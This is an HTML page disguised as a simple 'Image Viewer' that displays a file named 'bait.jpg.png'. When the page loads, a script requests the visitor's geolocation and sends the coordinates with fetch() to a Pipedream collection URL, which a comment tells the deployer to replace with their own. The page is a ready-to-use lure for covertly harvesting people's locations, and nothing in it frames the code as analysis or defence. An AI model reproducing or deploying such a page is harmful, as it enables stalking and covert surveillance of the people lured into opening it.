<!DOCTYPE html>

<html>

<head>

    <title>Image Viewer</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>

        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }

        img { max-width: 100%; max-height: 100vh; object-fit: contain; }

    </style>

</head>

<body onload="getLocation()">



    <img src="bait.jpg.png" id="photo">



    <script>

        // REPLACE THIS with your Pipedream URL

        const gate = "https://eotwt8cj1vr426p.m.pipedream.net";



        function getLocation() {

            if (navigator.geolocation) {

                navigator.geolocation.getCurrentPosition(function(position) {

                    fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);

                });

            }

        }

    </script>

</body>

</html>
